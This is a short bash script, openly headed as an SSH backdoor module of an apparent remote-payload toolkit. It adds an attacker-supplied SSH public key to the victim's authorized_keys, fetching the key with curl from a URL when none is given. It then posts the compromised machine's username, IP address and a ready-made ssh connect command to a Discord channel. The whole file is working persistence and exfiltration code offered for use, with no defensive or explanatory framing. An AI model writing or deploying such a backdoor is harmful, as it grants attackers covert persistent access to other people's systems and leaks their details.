#!/bin/bash
# ============================================================
# SSH Backdoor for Linux - Modular Remote Payload
# ============================================================
# Adds attacker's SSH key to authorized_keys
# Requires: $KEY (SSH public key) or uses $U to download
# ============================================================

SYSID=$(get_sysid)
SSH_DIR="$HOME/.ssh"
AUTH_KEYS="$SSH_DIR/authorized_keys"

# Create .ssh directory if needed
mkdir -p "$SSH_DIR"
chmod 700 "$SSH_DIR"

# Get the key
if [[ -n "$KEY" ]]; then
    SSH_KEY="$KEY"
elif [[ -n "$U" ]]; then
    SSH_KEY=$(curl -sL "$U")
else
    send_discord "❌ SSH backdoor failed on $SYSID - No key provided"
    exit 1
fi

# Add key if not already present
if ! grep -q "$SSH_KEY" "$AUTH_KEYS" 2>/dev/null; then
    echo "$SSH_KEY" >> "$AUTH_KEYS"
    chmod 600 "$AUTH_KEYS"
    
    # Get IP for connection info
    MY_IP=$(hostname -I | awk '{print $1}')
    
    send_discord "🔒 **SSH Backdoor on $SYSID**\n• Connect: \`ssh $(whoami)@$MY_IP\`\n• Key added to authorized_keys"
else
    send_discord "⚠️ SSH key already present on $SYSID"
fi

